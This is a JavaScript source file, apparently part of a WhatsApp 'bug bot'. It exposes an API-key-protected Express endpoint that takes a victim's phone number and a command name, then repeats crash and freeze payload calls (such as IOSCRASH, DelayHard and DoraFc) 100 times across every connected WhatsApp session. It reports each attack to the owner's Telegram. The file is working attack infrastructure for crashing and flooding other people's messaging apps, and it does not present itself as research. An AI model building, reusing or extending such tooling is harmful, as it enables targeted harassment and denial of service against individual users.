const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const crypto = require("crypto");
const axios = require("axios");

const CONFIG_FILE = "./botApiConfig.json";
const BOT_API_PORT = 2000;

let botContext = null;
let webSelectedSessions = [];
let config = { apiKey: null, publicUrl: null };

function loadOrCreateConfig() {
    if (fs.existsSync(CONFIG_FILE)) {
        try {
            const saved = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
            if (saved.apiKey) {
                config.apiKey = saved.apiKey;
                config.publicUrl = saved.publicUrl || null;
                return;
            }
        } catch (e) {}
    }
    config.apiKey = "dora_" + crypto.randomBytes(24).toString("hex");
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

async function detectPublicUrl() {
    const services = [
        { url: "https://api.ipify.org?format=json", parse: (d) => d.ip },
        { url: "https://ifconfig.me/ip", parse: (d) => d.trim() },
        { url: "https://icanhazip.com", parse: (d) => d.trim() },
        { url: "https://api.my-ip.io/ip.json", parse: (d) => d.ip }
    ];
    for (const s of services) {
        try {
            const r = await axios.get(s.url, { timeout: 5000 });
            const ip = s.parse(r.data);
            if (ip && /^[\d.:a-fA-F]+$/.test(ip)) {
                config.publicUrl = "http://" + ip + ":" + BOT_API_PORT;
                fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
                return;
            }
        } catch (e) {}
    }
    config.publicUrl = "http://YOUR_SERVER_IP:" + BOT_API_PORT;
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
}

async function sendConfigToOwner() {
    if (!botContext || !botContext.bot) return;
    try {
        await botContext.bot.api.sendMessage(
            botContext.ownerId,
            "<b>🤖 BOT API CONFIG</b>\n\n" +
            "<b>PUBLIC URL:</b>\n<code>" + config.publicUrl + "</code>\n\n" +
            "<b>API KEY:</b>\n<code>" + config.apiKey + "</code>\n\n" +
            "<i>Copy these values to Render environment variables:</i>\n" +
            "<code>BOT_API_URL</code>\n" +
            "<code>BOT_API_KEY</code>",
            { parse_mode: "HTML" }
        );
        botContext.log.success("BOT API config sent to owner Telegram");
    } catch (e) {
        botContext.log.error("Failed to send config: " + e.message);
    }
}

function initBotApi(context) {
    botContext = context;
    loadOrCreateConfig();

    detectPublicUrl().then(() => {
        console.log("\n========================================");
        console.log("BOT API CONFIG");
        console.log("========================================");
        console.log("URL : " + config.publicUrl);
        console.log("KEY : " + config.apiKey);
        console.log("========================================\n");
        sendConfigToOwner();
    });

    const apiApp = express();
    apiApp.use(bodyParser.json());

    apiApp.post("/api/execute", async (req, res) => {
        const apiKey = req.headers["x-api-key"];
        if (apiKey !== config.apiKey) {
            return res.status(401).json({ success: false, message: "Unauthorized" });
        }

        const { target, command, user } = req.body;
        if (!target || !command) {
            return res.status(400).json({ success: false, message: "Missing target or command" });
        }

        const X = target + "@s.whatsapp.net";
        let targets = botContext.getActiveSocks(botContext.ownerId);

        if (webSelectedSessions.length) {
            targets = targets.filter(t => webSelectedSessions.indexOf(t.id) !== -1);
        }

        if (!targets.length) {
            return res.status(400).json({ success: false, message: "No active WhatsApp sessions" });
        }

        botContext.log.info("WEB API: /" + command + " -> " + target + " (" + user + ") sessions=" + targets.length);

        setImmediate(async () => {
            for (let z = 0; z < 100; z++) {
                for (const { sock: client, id: sessionId } of targets) {
                    try {
                        switch (command) {
                            case "IOSCRASH":
                                await botContext.bugs.iosNewCrash(client, X);
                                await botContext.bugs.IosdoraInvisible(client, X);
                                break;
                            case "DORAIOS":
                                await botContext.bugs.dora(client, X);
                                await botContext.bugs.fiOS(client, X);
                                break;
                            case "frezewa":
                                await botContext.bugs.StuckNewAmba(client, X);
                                await botContext.bugs.XvZFreezeXDelayHard(client, X);
                                break;
                            case "fcbeta":
                                await botContext.bugs.Cong(client, X);
                                break;
                            case "andro":
                                await botContext.bugs.iosNewCrash(client, X);
                                await botContext.bugs.IosdoraInvisible(client, X);
                                break;
                            case "DelayHard":
                                await botContext.bugs.StuckLogo(client, X);
                                await botContext.bugs.StuckNewAmba(client, X);
                                await botContext.bugs.XvZFreezeXDelayHard(client, X);
                                break;
                            case "buldozer":
                                await botContext.bugs.StuckLogo(client, X);
                                await botContext.bugs.StuckDora(client, X);
                                break;
                            case "hima":
                                await botContext.bugs.Fcinvisible(client, X);
                                break;
                            case "DoraFc":
                                await botContext.bugs.DoraFc(client, X);
                                break;
                        }
                    } catch (e) {
                        botContext.log.error("[" + sessionId + "] API " + command + ": " + e.message);
                    }
                }
            }
        });

        try {
            await botContext.bot.api.sendMessage(
                botContext.ownerId,
                "WEB EXEC\nUser: " + user + "\nTarget: " + target + "\nCommand: /" + command + "\nSessions: " + targets.length
            );
        } catch (e) {}

        res.json({ success: true, message: "Queued" });
    });

    apiApp.get("/api/sessions", (req, res) => {
        const apiKey = req.headers["x-api-key"];
        if (apiKey !== config.apiKey) return res.status(401).json({ success: false, message: "Unauthorized" });
        try {
            const all = Object.keys(botContext.waClients || {});
            const sessions = all.map(id => ({
                id: id,
                status: botContext.waClients[id]?.status || "unknown"
            }));
            res.json({ success: true, sessions: sessions, selected: webSelectedSessions });
        } catch (e) {
            res.json({ success: false, message: e.message });
        }
    });

    apiApp.post("/api/select-sessions", (req, res) => {
        const apiKey = req.headers["x-api-key"];
        if (apiKey !== config.apiKey) return res.status(401).json({ success: false, message: "Unauthorized" });
        webSelectedSessions = req.body.sessions || [];
        botContext.log.info("WEB sessions selected: " + (webSelectedSessions.length || "ALL"));
        res.json({ success: true, message: "Selection saved: " + webSelectedSessions.length + " session(s)" });
    });

    apiApp.get("/api/health", (req, res) => {
        res.json({ status: "ok", time: new Date().toISOString() });
    });

    apiApp.get("/api/config", (req, res) => {
        const apiKey = req.headers["x-api-key"];
        if (apiKey !== config.apiKey) return res.status(401).json({ success: false, message: "Unauthorized" });
        res.json({ success: true, url: config.publicUrl, key: config.apiKey });
    });

    apiApp.listen(BOT_API_PORT, "0.0.0.0", () => {
        console.log("BOT API ON PORT " + BOT_API_PORT);
    });
}

module.exports = { initBotApi };
